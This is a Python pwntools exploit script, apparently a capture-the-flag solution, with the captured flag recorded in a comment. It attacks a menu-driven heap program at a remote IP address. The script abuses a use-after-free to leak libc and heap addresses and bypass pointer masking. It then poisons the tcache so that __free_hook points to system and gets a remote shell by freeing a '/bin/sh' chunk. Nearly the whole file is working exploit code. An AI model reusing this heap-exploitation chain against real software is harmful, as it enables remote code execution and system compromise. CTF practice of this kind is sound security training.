#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('./a.out')
libc = ELF('./libc.so.6')


# p = process(["./ld-2.32_64.so", './a.out'], env={ 'LD_PRELOAD': os.path.abspath("./libc.so.6") })
# gdb.attach(p, 'init-gef')
p = remote('34.136.150.230', 49153)

def menu(idx):
    p.sendlineafter("> ", str(idx))

def add(idx, sz, data):
    menu(1)
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("sz: ", str(sz))
    p.sendlineafter("data: ", data)

def show(idx):
    menu(2)
    p.sendlineafter("idx: ", str(idx))
    p.recvuntil("data: ")
    return p.recvline(False)

def edit(idx, data):
    menu(3)
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("data: ", data)

def delete(idx):
    menu(4)
    p.sendlineafter("idx: ", str(idx))

def save(idx):
    menu(5)
    p.sendlineafter("idx: ", str(idx))

add(0, 0x410, "A" * 20)
add(1, 0x40, "/bin/sh\x00")

save(0)
delete(0)

# move freed chunk from unsorted bin to large bin (null byte issue with
# unsorted bin)
add(2, 0x420, "A" * 20)

libc_base = u64(show(0).ljust(8, '\x00')) - 0x1e3ff0
log.info("Libc: 0x{:x}".format(libc_base))

# split chunk from large bin, so that now, 0 points to this chunk
add(3, 0x200, "A" * 20)
add(4, 0x200, "A" * 20)

# delete tcache chunk for heap leak
delete(3)
delete(4)

heap_base = u64(show(0).ljust(8, '\x00')) << 12
log.info("Heap: 0x{:x}".format(heap_base))

some_addr = heap_base + 0x10

def mask(val):
    return val ^ (heap_base >> 12)

free_hook = libc_base + 0x1e6e40

edit(0, "A" * 0x210 + p64(mask(free_hook)) + p64(some_addr)[:-1])

system = libc_base + libc.symbols['system']

add(4, 0x200, "A" * 20)
add(3, 0x200, p64(system) + p64(0)[:-1])
delete(1)

p.interactive()
# BSNoida{1_h0p3_y0u_4r3_w4rm3d_up_n0w_8E64}

